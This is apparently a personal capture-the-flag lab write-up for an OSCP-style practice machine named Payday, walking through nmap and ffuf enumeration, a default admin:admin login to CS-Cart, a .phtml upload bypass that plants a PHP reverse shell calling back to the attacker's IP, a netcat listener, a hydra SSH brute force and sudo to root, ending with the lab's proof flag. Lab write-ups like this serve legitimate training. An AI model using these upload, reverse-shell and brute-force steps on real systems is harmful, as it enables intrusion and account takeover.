> Noamro08 - 1 Feb 2024

### Enumeration

nmap scan (scripts and services):
```bash
nmap -Pn -n -sVC 192.168.170.39 -oN scan.inital 
Starting Nmap 7.94 ( https://nmap.org ) at 2024-02-01 12:24 IST
Nmap scan report for 192.168.170.39
Host is up (0.077s latency).
Not shown: 992 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.6p1 Debian 5build1 (protocol 2.0)
| ssh-hostkey: 
|   1024 f3:6e:87:04:ea:2d:b3:60:ff:42:ad:26:67:17:94:d5 (DSA)
|_  2048 bb:03:ce:ed:13:f1:9a:9e:36:03:e2:af:ca:b2:35:04 (RSA)
80/tcp  open  http        Apache httpd 2.2.4 ((Ubuntu) PHP/5.2.3-1ubuntu6)
|_http-server-header: Apache/2.2.4 (Ubuntu) PHP/5.2.3-1ubuntu6
|_http-title: CS-Cart. Powerful PHP shopping cart software
110/tcp open  pop3        Dovecot pop3d
| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2008-04-25T02:02:48
|_Not valid after:  2008-05-25T02:02:48
|_ssl-date: 2024-02-01T10:25:15+00:00; -5s from scanner time.
|_pop3-capabilities: TOP UIDL CAPA PIPELINING RESP-CODES SASL STLS
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|_    SSL2_RC2_128_CBC_WITH_MD5
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MSHOME)
143/tcp open  imap        Dovecot imapd
| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2008-04-25T02:02:48
|_Not valid after:  2008-05-25T02:02:48
|_ssl-date: 2024-02-01T10:25:15+00:00; -5s from scanner time.
|_imap-capabilities: LOGINDISABLEDA0001 STARTTLS LITERAL+ IDLE Capability OK CHILDREN completed LOGIN-REFERRALS MULTIAPPEND IMAP4rev1 THREAD=REFERENCES UNSELECT NAMESPACE SASL-IR SORT
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|_    SSL2_RC2_128_CBC_WITH_MD5
445/tcp open  @           Samba smbd 3.0.26a (workgroup: MSHOME)
993/tcp open  ssl/imap    Dovecot imapd
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|_    SSL2_RC2_128_CBC_WITH_MD5
| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2008-04-25T02:02:48
|_Not valid after:  2008-05-25T02:02:48
|_imap-capabilities: LOGIN-REFERRALS LITERAL+ IDLE Capability OK CHILDREN completed AUTH=PLAINA0001 MULTIAPPEND IMAP4rev1 THREAD=REFERENCES UNSELECT NAMESPACE SASL-IR SORT
|_ssl-date: 2024-02-01T10:25:15+00:00; -5s from scanner time.
995/tcp open  ssl/pop3    Dovecot pop3d
|_ssl-date: 2024-02-01T10:25:15+00:00; -5s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|_    SSL2_RC2_128_CBC_WITH_MD5
| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2008-04-25T02:02:48
|_Not valid after:  2008-05-25T02:02:48
|_pop3-capabilities: TOP UIDL CAPA PIPELINING RESP-CODES SASL(PLAIN) USER
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.26a)
|   Computer name: payday
|   NetBIOS computer name: 
|   Domain name: 
|   FQDN: payday
|_  System time: 2024-02-01T05:25:07-05:00
|_clock-skew: mean: 49m55s, deviation: 2h02m28s, median: -5s
|_smb2-time: Protocol negotiation failed (SMB2)
```

browsing to the site we can see a "CS-CART" site for users to buy things, navigating the UI there is a login and **admin:admin** works but this login is not helping because it is for regular users that come to buy and there is nothing we can do with the admin user.

so we try to fuzz directories woith ffuf:
```bash
(kali㉿kali)-[~]
└─$ ffuf -u http://192.168.170.39/FUZZ -w /usr/share/dirb/wordlists/common.txt      

 :: Method           : GET
 :: URL              : http://192.168.170.39/FUZZ
 :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.hta                    [Status: 403, Size: 304, Words: 22, Lines: 11, Duration: 90ms]
.htaccess               [Status: 403, Size: 309, Words: 22, Lines: 11, Duration: 87ms]
.htpasswd               [Status: 403, Size: 309, Words: 22, Lines: 11, Duration: 88ms]
                        [Status: 200, Size: 28074, Words: 1558, Lines: 676, Duration: 115ms]
addons                  [Status: 301, Size: 335, Words: 21, Lines: 10, Duration: 76ms]
admin                   [Status: 200, Size: 9483, Words: 393, Lines: 263, Duration: 136ms]
admin.php               [Status: 200, Size: 9483, Words: 393, Lines: 263, Duration: 129ms]
```

and there is admin.php:
and here we can log in and do some stuff, searching a little bit in google for exploits to authenticated RCE we get this github that explains hoe to upload a php file that will bypass the ".php" extension filtered.
"https://gist.github.com/momenbasel/ccb91523f86714edb96c871d4cf1d05c"
![[Pasted image 20240201131318.png]]

so we follow the stages and it is working:

so lets upload a rev.php file:
```bash
cp /usr/share/webshells/php/php-reverse-shell.php ~/Desktop/oscp/PG/practice/payday
# changing the ip and port and the .php to .phtml for this file upload to bypass the security filter only html...

(kali㉿kali)-[~/…/oscp/PG/practice/payday]
└─$ head rev.phtml                         
<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.45.182';  // CHANGE THIS
$port = 80;       // CHANGE THIS
....
```

uploading the file:
![[Pasted image 20240201131431.png]]
<center>navigating to the rev shell file we uploaded "http://$IP/skins/rev.phtml"</center>

we open `nc -nvlp 80` and wait for the rev shell to pop:
![[Pasted image 20240201131915.png]]
worked!

now we upgrade the shell:
```bash
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@payday:/$ export TERM=xterm
export TERM=xterm
www-data@payday:/$ ^Z
zsh: suspended  nc -nvlp 80
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/…/oscp/PG/practice/payday]
└─$ stty raw -echo; fg
```

searching for ways to get root user or patrick trhat we can see is part of adm goup which is sudoers and nothing was found with linpeas and manually, at the end by brutforcing the user patrick we found that his password is patrick:
```bash
hydra -l patrick -P /usr/share/wordlist/rockyou.txt 192.168.170.39 ssh

patrick:patrick
```

so now we switch to patrick:
```bash
www-data@payday:/root$ su patrick
patrick@payday:/root$ id
uid=1000(patrick) gid=1000(patrick) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),104(scanner),115(lpadmin),1000(patrick)

patrick@payday:/root$ sudo -l

[sudo] password for patrick:
User patrick may run the following commands on this host:
    (ALL) ALL
patrick@payday:/root$ sudo cat /root/proof.txt 
bb73b4a4a5dad21b6e50c24292acbafe
```